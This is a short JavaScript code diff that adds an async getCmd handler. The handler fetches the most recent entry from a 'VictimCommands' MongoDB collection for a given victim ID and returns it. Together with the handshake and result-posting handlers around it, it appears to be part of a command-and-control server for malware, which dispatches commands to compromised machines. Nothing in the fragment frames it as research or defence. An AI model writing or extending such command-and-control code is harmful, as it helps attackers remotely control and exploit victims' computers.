@@ -42,8 +42,29 @@ async function initialHandshake(req, res) {
 	}
 }
 
-function getCmd(req, res) {
+async function getCmd(req, res) {
 	const username = req.username;
+
+	const filterVictim = { victimId: username }; // desired filter criteria
+
+	const victimCmdList = await mongodb.VictimCommands.find(filterVictim)
+		.sort({ timestamp: -1 }) // Sort in descending order based on timestamp
+		.limit(1) // Limit the result to 1 record (the latest one)
+		.exec();
+
+	if (victimCmdList.length > 0) {
+		const latestCmd = victimCmdList[0];
+		return res.status(200).send({
+			status: true,
+			latestCmd,
+		});
+	} else {
+		console.log("No commands found for the victim.");
+		return res.status(200).send({
+			status: false,
+			message: "No commands found for the victim.",
+		});
+	}
 }
 
 function postResult(req, res) {
